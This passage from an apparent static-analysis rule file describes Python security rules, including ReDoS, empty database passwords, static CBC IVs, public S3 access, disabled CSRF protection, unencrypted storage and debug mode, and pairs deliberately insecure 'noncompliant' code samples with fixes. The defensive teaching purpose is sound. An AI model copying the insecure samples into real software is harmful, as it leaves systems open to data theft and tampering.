Python 3.11). </li>\n  <li> Use negated character classes instead of <code>.</code> to exclude separators where applicable. For example the quadratic regex\n  <code>.*_.*</code> can be made linear by changing it to <code>[^_]*_.*</code> </li>\n</ul>\n<p>Sometimes it’s not possible to rewrite the regex to be linear while still matching what you want it to match. Especially when using partial\nmatches, for which it is quite hard to avoid quadratic runtimes. In those cases consider the following approaches:</p>\n<ul>\n  <li> Solve the problem without regular expressions </li>\n  <li> Use an alternative non-backtracking regex implementations such as Google’s <a href=\"https://github.com/google/re2\">RE2</a>. </li>\n  <li> Use multiple passes. This could mean pre- and/or post-processing the string manually before/after applying the regular expression to it or\n  using multiple regular expressions. One example of this would be to replace <code>re.split(\"\\s*,\\s*\", my_str)</code> with <code>re.split(\",\",\n  my_str)</code> and then trimming the spaces from the strings as a second step. </li>\n</ul>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/400\">CWE-400 - Uncontrolled Resource Consumption</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/1333\">CWE-1333 - Inefficient Regular Expression Complexity</a> </li>\n  <li> <a href=\"https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS\">owasp.org</a> - OWASP Regular expression Denial\n  of Service - ReDoS </li>\n  <li> <a\n  href=\"https://web.archive.org/web/20220506215733/https://stackstatus.net/post/147710624694/outage-postmortem-july-20-2016\">stackstatus.net(archived)</a> - Outage Postmortem - July 20, 2016 </li>\n  <li> <a href=\"https://www.regular-expressions.info/catastrophic.html\">regular-expressions.info</a> - Runaway Regular Expressions: Catastrophic\n  Backtracking </li>\n  <li> <a\n  href=\"https://docs.microsoft.com/en-us/dotnet/standard/base-types/backtracking-in-regular-expressions#backtracking-with-nested-optional-quantifiers\">docs.microsoft.com</a> - Backtracking with Nested Optional Quantifiers </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "python:S2115": {
        "name": "A secure password should be used when connecting to a database",
        "htmlDesc": "<p>When accessing a database, an empty password should be avoided as it introduces a weakness.</p>\n<h2>Why is this an issue?</h2>\n<p>When a database does not require a password for authentication, it allows anyone to access and manipulate the data stored within it. Exploiting\nthis vulnerability typically involves identifying the target database and establishing a connection to it without the need for any authentication\ncredentials.</p>\n<h3>What is the potential impact?</h3>\n<p>Once connected, an attacker can perform various malicious actions, such as viewing, modifying, or deleting sensitive information, potentially\nleading to data breaches or unauthorized access to critical systems. It is crucial to address this vulnerability promptly to ensure the security and\nintegrity of the database and the data it contains.</p>\n<h4>Unauthorized Access to Sensitive Data</h4>\n<p>When a database lacks a password for authentication, it opens the door for unauthorized individuals to gain access to sensitive data. This can\ninclude personally identifiable information (PII), financial records, intellectual property, or any other confidential information stored in the\ndatabase. Without proper access controls in place, malicious actors can exploit this vulnerability to retrieve sensitive data, potentially leading to\nidentity theft, financial loss, or reputational damage.</p>\n<h4>Compromise of System Integrity</h4>\n<p>Without a password requirement, unauthorized individuals can gain unrestricted access to a database, potentially compromising the integrity of the\nentire system. Attackers can inject malicious code, alter configurations, or manipulate data within the database, leading to system malfunctions,\nunauthorized system access, or even complete system compromise. This can disrupt business operations, cause financial losses, and expose the\norganization to further security risks.</p>\n<h4>Unwanted Modifications or Deletions</h4>\n<p>The absence of a password for database access allows anyone to make modifications or deletions to the data stored within it. This poses a\nsignificant risk, as unauthorized changes can lead to data corruption, loss of critical information, or the introduction of malicious content. For\nexample, an attacker could modify financial records, tamper with customer orders, or delete important files, causing severe disruptions to business\nprocesses and potentially leading to financial and legal consequences.</p>\n<p>Overall, the lack of a password configured to access a database poses a serious security risk, enabling unauthorized access, data breaches, system\ncompromise, and unwanted modifications or deletions. It is essential to address this vulnerability promptly to safeguard sensitive data, maintain\nsystem integrity, and protect the organization from potential harm.</p>\n<h2>How to fix it in MySQL Connector/Python</h2>\n<h3>Code examples</h3>\n<p>The following code uses an empty password to connect to a MySQL database.</p>\n<p>The vulnerability can be fixed by using a strong password retrieved from an environment variable <code>DB_PASSWORD</code>. This environment\nvariable is set during deployment. It should be strong and different for each database.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"101\" data-diff-type=\"noncompliant\">\nfrom mysql.connector import connection\n\nconnection.MySQLConnection(host='localhost', user='sonarsource', password='')  # Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"101\" data-diff-type=\"compliant\">\nfrom mysql.connector import connection\nimport os\n\ndb_password = os.getenv('DB_PASSWORD')\nconnection.MySQLConnection(host='localhost', user='sonarsource', password=db_password)\n</pre>\n<h3>Pitfalls</h3>\n<h4>Hard-coded passwords</h4>\n<p>It could be tempting to replace the empty password with a hard-coded one. Hard-coding passwords in the code can pose significant security risks.\nHere are a few reasons why it is not recommended:</p>\n<ol>\n  <li> Security Vulnerability: Hard-coded passwords can be easily discovered by anyone who has access to the code, such as other developers or\n  attackers. This can lead to unauthorized access to the database and potential data breaches. </li>\n  <li> Lack of Flexibility: Hard-coded passwords make it difficult to change the password without modifying the code. If the password needs to be\n  updated, it would require recompiling and redeploying the code, which can be time-consuming and error-prone. </li>\n  <li> Version Control Issues: Storing passwords in code can lead to version control issues. If the code is shared or stored in a version control\n  system, the password will be visible to anyone with access to the repository, which is a security risk. </li>\n</ol>\n<p>To mitigate these risks, it is recommended to use secure methods for storing and retrieving passwords, such as using environment variables,\nconfiguration files, or secure key management systems. These methods allow for better security, flexibility, and separation of sensitive information\nfrom the codebase.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication\">Top 10 2017 Category A2 - Broken Authentication</a>\n  </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/521\">CWE-521 - Weak Password Requirements</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "python:S3329": {
        "name": "Cipher Block Chaining IVs should be unpredictable",
        "htmlDesc": "<p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>\n<h2>Why is this an issue?</h2>\n<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used\nfor several important reasons:</p>\n<ul>\n  <li> Confidentiality, privacy, and intellectual property protection </li>\n  <li> Security during transmission or on storage devices </li>\n  <li> Data integrity, general trust, and authentication </li>\n</ul>\n<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>\n<ol>\n  <li> No encryption is unbreakable. </li>\n  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>\n</ol>\n<p>In the mode Cipher Block Chaining (CBC), each block is used as cryptographic input for the next block. For this reason, the first block requires an\ninitialization vector (IV), also called a \"starting variable\" (SV).</p>\n<p>If the same IV is used for multiple encryption sessions or messages, each new encryption of the same plaintext input would always produce the same\nciphertext output. This may allow an attacker to detect patterns in the ciphertext.</p>\n<h3>What is the potential impact?</h3>\n<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that\nencryption was supposed to protect.</p>\n<p>Depending on the recovered data, the impact may vary.</p>\n<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>\n<h4>Additional attack surface</h4>\n<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can\nfurther exploit a system to obtain more information.<br> Encrypted values are often considered trustworthy because it would not be possible for a\nthird party to modify them under normal circumstances.</p>\n<h4>Breach of confidentiality and privacy</h4>\n<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,\nfinancial loss, reputational damage, or unauthorized access to confidential systems.</p>\n<p>In this scenario, a company, its employees, users, and partners could be seriously affected.</p>\n<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and\nstakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>\n<h4>Legal and compliance issues</h4>\n<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the\nplaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>\n<h2>How to fix it in pyca</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nfrom cryptography.hazmat.primitives.ciphers import (\n    Cipher,\n    algorithms,\n    modes,\n)\n\niv     = \"doNotTryThis@Home2023\"\ncipher = Cipher(algorithms.AES(key), modes.CBC(iv))\n\ncipher.encryptor()  # Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<p>In this example, the code explicitly uses a number generator that is considered <strong>strong</strong>.</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nfrom os import urandom\n\nfrom cryptography.hazmat.primitives.ciphers import (\n    Cipher,\n    algorithms,\n    modes,\n)\n\niv     = urandom(16)\ncipher = Cipher(algorithms.AES(key), modes.CBC(iv))\n\ncipher.encryptor()\n</pre>\n<h3>How does this work?</h3>\n<h4>Use unique IVs</h4>\n<p>To ensure high security, initialization vectors must meet two important criteria:</p>\n<ul>\n  <li> IVs must be unique for each encryption operation. </li>\n  <li> For CBC and CFB modes, a secure FIPS-compliant random number generator should be used to generate unpredictable IVs. </li>\n</ul>\n<p>The IV does not need be secret, so the IV or information sufficient to determine the IV may be transmitted along with the ciphertext.</p>\n<p>In the previous non-compliant example, the problem is not that the IV is hard-coded.<br> It is that the same IV is used for multiple encryption\nattempts.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/329\">CWE-329 - Not Using an Unpredictable IV with CBC Mode</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/780\">CWE-780 - Use of RSA Algorithm without OAEP</a> </li>\n  <li> <a href=\"https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-38a.pdf\">NIST, SP-800-38A</a> - Recommendation for Block Cipher\n  Modes of Operation </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "python:S6265": {
        "name": "Granting access to S3 buckets to all or authenticated users is security-sensitive",
        "htmlDesc": "<p>Predefined permissions, also known as <a href=\"https://docs.aws.amazon.com/AmazonS3/latest/userguide/acl-overview.html#canned-acl\">canned ACLs</a>,\nare an easy way to grant large privileges to predefined groups or users.</p>\n<p>The following canned ACLs are security-sensitive:</p>\n<ul>\n  <li> <code>PUBLIC_READ</code>, <code>PUBLIC_READ_WRITE</code> grant respectively \"read\" and \"read and write\" privileges to everyone in the world\n  (<code>AllUsers</code> group). </li>\n  <li> <code>AUTHENTICATED_READ</code> grants \"read\" privilege to all authenticated users (<code>AuthenticatedUsers</code> group). </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The S3 bucket stores sensitive data. </li>\n  <li> The S3 bucket is not used to store static resources of websites (images, css …​). </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to implement the least privilege policy, i.e., to grant necessary permissions only to users for their required tasks. In the\ncontext of canned ACL, set it to <code>PRIVATE</code> (the default one), and if needed more granularity then use an appropriate S3 policy.</p>\n<h2>Sensitive Code Example</h2>\n<p>All users (ie: anyone in the world authenticated or not) have read and write permissions with the <code>PUBLIC_READ_WRITE</code> access\ncontrol:</p>\n<pre>\nbucket = s3.Bucket(self, \"bucket\",\n    access_control=s3.BucketAccessControl.PUBLIC_READ_WRITE     # Sensitive\n)\n\ns3deploy.BucketDeployment(self, \"DeployWebsite\",\n    access_control=s3.BucketAccessControl.PUBLIC_READ_WRITE     # Sensitive\n)\n</pre>\n<h2>Compliant Solution</h2>\n<p>With the <code>PRIVATE</code> access control (default), only the bucket owner has the read/write permissions on the buckets and its ACL.</p>\n<pre>\nbucket = s3.Bucket(self, \"bucket\",\n    access_control=s3.BucketAccessControl.PRIVATE       # Compliant\n)\n\n# Another example\ns3deploy.BucketDeployment(self, \"DeployWebsite\",\n    access_control=s3.BucketAccessControl.PRIVATE       # Compliant\n)\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/AmazonS3/latest/userguide/acl-overview.html#canned-acl\">AWS Documentation</a> - Access control list (ACL)\n  overview (canned ACLs) </li>\n  <li> <a href=\"https://docs.aws.amazon.com/AmazonS3/latest/userguide/walkthrough1.html\">AWS Documentation</a> - Controlling access to a bucket with\n  user policies </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/732\">CWE-732 - Incorrect Permission Assignment for Critical Resource</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/284\">CWE-284 - Improper Access Control</a> </li>\n  <li> <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_s3.Bucket.html\">AWS CDK version 2</a> - Class Bucket (construct) </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "python:S4502": {
        "name": "Disabling CSRF protections is security-sensitive",
        "htmlDesc": "<p>A cross-site request forgery (CSRF) attack occurs when a trusted user of a web application can be forced, by an attacker, to perform sensitive\nactions that he didn’t intend, such as updating his profile or sending a message, more generally anything that can change the state of the\napplication.</p>\n<p>The attacker can trick the user/victim to click on a link, corresponding to the privileged action, or to visit a malicious web site that embeds a\nhidden web request and as web browsers automatically include cookies, the actions can be authenticated and sensitive.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The web application uses cookies to authenticate users. </li>\n  <li> There exist sensitive operations in the web application that can be performed when the user is authenticated. </li>\n  <li> The state / resources of the web application can be modified by doing HTTP POST or HTTP DELETE requests for example. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Protection against CSRF attacks is strongly recommended:\n    <ul>\n      <li> to be activated by default for all <a href=\"https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Safe_methods\">unsafe HTTP\n      methods</a>. </li>\n      <li> implemented, for example, with an unguessable CSRF token </li>\n    </ul>  </li>\n  <li> Of course all sensitive operations should not be performed with <a\n  href=\"https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Safe_methods\">safe HTTP</a> methods like <code>GET</code> which are designed to be\n  used only for information retrieval. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>For a <a href=\"https://docs.djangoproject.com/fr/3.0/ref/csrf/\">Django</a> application, the code is sensitive when,</p>\n<ul>\n  <li> <code>django.middleware.csrf.CsrfViewMiddleware</code> is not used in the <a\n  href=\"https://docs.djangoproject.com/en/3.0/topics/settings/\">Django settings</a>: </li>\n</ul>\n<pre>\nMIDDLEWARE = [\n    'django.middleware.security.SecurityMiddleware',\n    'django.contrib.sessions.middleware.SessionMiddleware',\n    'django.middleware.common.CommonMiddleware',\n    'django.contrib.auth.middleware.AuthenticationMiddleware',\n    'django.contrib.messages.middleware.MessageMiddleware',\n    'django.middleware.clickjacking.XFrameOptionsMiddleware',\n] # Sensitive: django.middleware.csrf.CsrfViewMiddleware is missing\n</pre>\n<ul>\n  <li> the CSRF protection is disabled on a view: </li>\n</ul>\n<pre>\n@csrf_exempt # Sensitive\ndef example(request):\n    return HttpResponse(\"default\")\n</pre>\n<p>For a <a href=\"https://flask-wtf.readthedocs.io/en/latest/csrf.html\">Flask</a> application, the code is sensitive when,</p>\n<ul>\n  <li> the <code>WTF_CSRF_ENABLED</code> setting is set to <code>false</code>: </li>\n</ul>\n<pre>\napp = Flask(__name__)\napp.config['WTF_CSRF_ENABLED'] = False # Sensitive\n</pre>\n<ul>\n  <li> the application doesn’t use the <code>CSRFProtect</code> module: </li>\n</ul>\n<pre>\napp = Flask(__name__) # Sensitive: CSRFProtect is missing\n\n@app.route('/')\ndef hello_world():\n    return 'Hello, World!'\n</pre>\n<ul>\n  <li> the CSRF protection is disabled on a view: </li>\n</ul>\n<pre>\napp = Flask(__name__)\ncsrf = CSRFProtect()\ncsrf.init_app(app)\n\n@app.route('/example/', methods=['POST'])\n@csrf.exempt # Sensitive\ndef example():\n    return 'example '\n</pre>\n<ul>\n  <li> the CSRF protection is disabled on a form: </li>\n</ul>\n<pre>\nclass unprotectedForm(FlaskForm):\n    class Meta:\n        csrf = False # Sensitive\n\n    name = TextField('name')\n    submit = SubmitField('submit')\n</pre>\n<h2>Compliant Solution</h2>\n<p>For a <a href=\"https://docs.djangoproject.com/fr/3.0/ref/csrf/\">Django</a> application,</p>\n<ul>\n  <li> it is recommended to protect all the views with <code>django.middleware.csrf.CsrfViewMiddleware</code>: </li>\n</ul>\n<pre>\nMIDDLEWARE = [\n    'django.middleware.security.SecurityMiddleware',\n    'django.contrib.sessions.middleware.SessionMiddleware',\n    'django.middleware.common.CommonMiddleware',\n    'django.middleware.csrf.CsrfViewMiddleware', # Compliant\n    'django.contrib.auth.middleware.AuthenticationMiddleware',\n    'django.contrib.messages.middleware.MessageMiddleware',\n    'django.middleware.clickjacking.XFrameOptionsMiddleware',\n]\n</pre>\n<ul>\n  <li> and to not disable the CSRF protection on specific views: </li>\n</ul>\n<pre>\ndef example(request): # Compliant\n    return HttpResponse(\"default\")\n</pre>\n<p>For a <a href=\"https://flask-wtf.readthedocs.io/en/latest/csrf.html\">Flask</a> application,</p>\n<ul>\n  <li> the <code>CSRFProtect</code> module should be used (and not disabled further with <code>WTF_CSRF_ENABLED</code> set to <code>false</code>):\n  </li>\n</ul>\n<pre>\napp = Flask(__name__)\ncsrf = CSRFProtect()\ncsrf.init_app(app) # Compliant\n</pre>\n<ul>\n  <li> and it is recommended to not disable the CSRF protection on specific views or forms: </li>\n</ul>\n<pre>\n@app.route('/example/', methods=['POST']) # Compliant\ndef example():\n    return 'example '\n\nclass unprotectedForm(FlaskForm):\n    class Meta:\n        csrf = True # Compliant\n\n    name = TextField('name')\n    submit = SubmitField('submit')\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/352\">CWE-352 - Cross-Site Request Forgery (CSRF)</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> <a href=\"https://owasp.org/www-community/attacks/csrf\">OWASP: Cross-Site Request Forgery</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "python:S6245": {
        "name": "Disabling server-side encryption of S3 buckets is security-sensitive",
        "htmlDesc": "<p>This rule is deprecated, and will eventually be removed.</p>\n<p>Server-side encryption (SSE) encrypts an object (not the metadata) as it is written to disk (where the S3 bucket resides) and decrypts it as it is\nread from disk. This doesn’t change the way the objects are accessed, as long as the user has the necessary permissions, objects are retrieved as if\nthey were unencrypted. Thus, SSE only helps in the event of disk thefts, improper disposals of disks and other attacks on the AWS infrastructure\nitself.</p>\n<p>There are three SSE options:</p>\n<ul>\n  <li> Server-Side Encryption with Amazon S3-Managed Keys (SSE-S3)\n    <ul>\n      <li> AWS manages encryption keys and the encryption itself (with AES-256) on its own. </li>\n    </ul>  </li>\n  <li> Server-Side Encryption with Customer Master Keys (CMKs) Stored in AWS Key Management Service (SSE-KMS)\n    <ul>\n      <li> AWS manages the encryption (AES-256) of objects and encryption keys provided by the AWS KMS service. </li>\n    </ul>  </li>\n  <li> Server-Side Encryption with Customer-Provided Keys (SSE-C)\n    <ul>\n      <li> AWS manages only the encryption (AES-256) of objects with encryption keys provided by the customer. AWS doesn’t store the customer’s\n      encryption keys. </li>\n    </ul>  </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The S3 bucket stores sensitive information. </li>\n  <li> The infrastructure needs to comply to some regulations, like HIPAA or PCI DSS, and other standards. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to use SSE. Choosing the appropriate option depends on the level of control required for the management of encryption keys.</p>\n<h2>Sensitive Code Example</h2>\n<p>Server-side encryption is not used:</p>\n<pre>\nbucket = s3.Bucket(self,\"bucket\",\n    encryption=s3.BucketEncryption.UNENCRYPTED       # Sensitive\n)\n</pre>\n<p>The default value of <code>encryption</code> is <code>KMS</code> if <code>encryptionKey</code> is set. Otherwise, if both parameters are absent the\nbucket is unencrypted.</p>\n<h2>Compliant Solution</h2>\n<p>Server-side encryption with Amazon S3-Managed Keys is used:</p>\n<pre>\nbucket = s3.Bucket(self,\"bucket\",\n    encryption=s3.BucketEncryption.S3_MANAGED\n)\n\n# Alternatively with a KMS key managed by the user.\n\nbucket = s3.Bucket(self,\"bucket\",\n    encryptionKey=access_key\n)\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/AmazonS3/latest/userguide/serv-side-encryption.html\">AWS documentation</a> - Protecting data using\n  server-side encryption </li>\n  <li> <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_s3.BucketEncryption.html\">AWS CDK version 2</a> - BucketEncryption </li>\n</ul>",
        "severity": "MINOR"
      },
      "python:S6270": {
        "name": "Policies authorizing public access to resources are security-sensitive",
        "htmlDesc": "<p>Resource-based policies granting access to all users can lead to information leakage.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The AWS resource stores or processes sensitive data. </li>\n  <li> The AWS resource is designed to be private. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to implement the least privilege principle, i.e. to grant necessary permissions only to users for their required tasks. In the\ncontext of resource-based policies, list the principals that need the access and grant to them only the required privileges.</p>\n<h2>Sensitive Code Example</h2>\n<p>This policy allows all users, including anonymous ones, to access an S3 bucket:</p>\n<pre>\nfrom aws_cdk.aws_iam import PolicyStatement, AnyPrincipal, Effect\nfrom aws_cdk.aws_s3 import Bucket\n\nbucket = Bucket(self, \"ExampleBucket\")\n\nbucket.add_to_resource_policy(PolicyStatement(\n  effect=Effect.ALLOW,\n  actions=[\"s3:*\"],\n  resources=[bucket.arn_for_objects(\"*\")],\n  principals=[AnyPrincipal()] # Sensitive\n))\n</pre>\n<h2>Compliant Solution</h2>\n<p>This policy allows only the authorized users:</p>\n<pre>\nfrom aws_cdk.aws_iam import PolicyStatement, AccountRootPrincipal, Effect\nfrom aws_cdk.aws_s3 import Bucket\n\nbucket = Bucket(self, \"ExampleBucket\")\n\nbucket.add_to_resource_policy(PolicyStatement(\n  effect=Effect.ALLOW,\n  actions=[\"s3:*\"],\n  resources=[bucket.arn_for_objects(\"*\")],\n  principals=[AccountRootPrincipal()]\n))\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege\">AWS Documentation</a> - Grant least\n  privilege </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/732\">CWE-732 - Incorrect Permission Assignment for Critical Resource</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/284\">CWE-284 - Improper Access Control</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "python:S6275": {
        "name": "Using unencrypted EBS volumes is security-sensitive",
        "htmlDesc": "<p>Amazon Elastic Block Store (EBS) is a block-storage service for Amazon Elastic Compute Cloud (EC2). EBS volumes can be encrypted, ensuring the\nsecurity of both data-at-rest and data-in-transit between an instance and its attached EBS storage. In the case that adversaries gain physical access\nto the storage medium they are not able to access the data. Encryption can be enabled for specific volumes or for <a\nhref=\"https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/EBSEncryption.html#encryption-by-default\">all new volumes and snapshots</a>. Volumes created\nfrom snapshots inherit their encryption configuration. A volume created from an encrypted snapshot will also be encrypted by default.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The disk contains sensitive data that could cause harm when leaked. </li>\n  <li> There are compliance requirements for the service to store data encrypted. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to encrypt EBS volumes that contain sensitive information. Encryption and decryption are handled transparently by EC2, so no\nfurther modifications to the application are necessary. Instead of enabling encryption for every volume, it is also possible to enable encryption\nglobally for a specific region. While creating volumes from encrypted snapshots will result in them being encrypted, explicitly enabling this security\nparameter will prevent any future unexpected security downgrade.</p>\n<h2>Sensitive Code Example</h2>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.Volume.html\">aws_cdk.aws_ec2.Volume</a>:</p>\n<pre>\nfrom aws_cdk.aws_ec2 import Volume\n\nclass EBSVolumeStack(Stack):\n\n    def __init__(self, scope: Construct, construct_id: str, **kwargs) -&gt; None:\n        super().__init__(scope, construct_id, **kwargs)\n        Volume(self,\n            \"unencrypted-explicit\",\n            availability_zone=\"eu-west-1a\",\n            size=Size.gibibytes(1),\n            encrypted=False  # Sensitive\n        )\n</pre>\n<pre>\nfrom aws_cdk.aws_ec2 import Volume\n\nclass EBSVolumeStack(Stack):\n\n    def __init__(self, scope: Construct, construct_id: str, **kwargs) -&gt; None:\n        super().__init__(scope, construct_id, **kwargs)\n        Volume(self,\n            \"unencrypted-implicit\",\n            availability_zone=\"eu-west-1a\",\n            size=Size.gibibytes(1)\n        ) # Sensitive as encryption is disabled by default\n</pre>\n<h2>Compliant Solution</h2>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.Volume.html\">aws_cdk.aws_ec2.Volume</a>:</p>\n<pre>\nfrom aws_cdk.aws_ec2 import Volume\n\nclass EBSVolumeStack(Stack):\n\n    def __init__(self, scope: Construct, construct_id: str, **kwargs) -&gt; None:\n        super().__init__(scope, construct_id, **kwargs)\n        Volume(self,\n            \"encrypted-explicit\",\n            availability_zone=\"eu-west-1a\",\n            size=Size.gibibytes(1),\n            encrypted=True\n        )\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/EBSEncryption.html\">Amazon EBS encryption</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/311\">CWE-311 - Missing Encryption of Sensitive Data</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "python:S4507": {
        "name": "Delivering code in production with debug features activated is security-sensitive",
        "htmlDesc": "<p>Development tools and frameworks usually have options to make debugging easier for developers. Although these features are useful during\ndevelopment, they should never be enabled for applications deployed in production. Debug instructions or error messages can leak detailed information\nabout the system, like the application’s path or file names.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The code or configuration enabling the application debug features is deployed on production servers or distributed to end users. </li>\n  <li> The application runs by default with debug features activated. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Do not enable debugging features on production servers or applications distributed to end users.</p>\n<h2>Sensitive Code Example</h2>\n<p>Django application startup:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nfrom django.conf import settings\n\nsettings.configure(DEBUG=True)  # Sensitive when set to True\nsettings.configure(DEBUG_PROPAGATE_EXCEPTIONS=True)  # Sensitive when set to True\n\ndef custom_config(config):\n    settings.configure(default_settings=config, DEBUG=True)  # Sensitive\n</pre>\n<p>Inside <code>settings.py</code> or <code>global_settings.py</code>, which are the default configuration files for a Django application:</p>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nDEBUG = True  # Sensitive\nDEBUG_PROPAGATE_EXCEPTIONS = True  # Sensitive\n</pre>\n<p>Flask application startup:</p>\n<pre data-diff-id=\"3\" data-diff-type=\"noncompliant\">\nfrom flask import Flask\n\napp = Flask()\napp.debug = True  # Sensitive\napp.run(debug=True)  # Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nfrom django.conf import settings\n\nsettings.configure(DEBUG=False)\nsettings.configure(DEBUG_PROPAGATE_EXCEPTIONS=False)\n\ndef custom_config(config):\n    settings.configure(default_settings=config, DEBUG=False)\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nDEBUG = False\nDEBUG_PROPAGATE_EXCEPTIONS = False\n</pre>\n<pre data-diff-id=\"3\" data-diff-type=\"compliant\">\nfrom flask import Flask\n\napp = Flask()\napp.debug = False\napp.run(debug=False)\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a 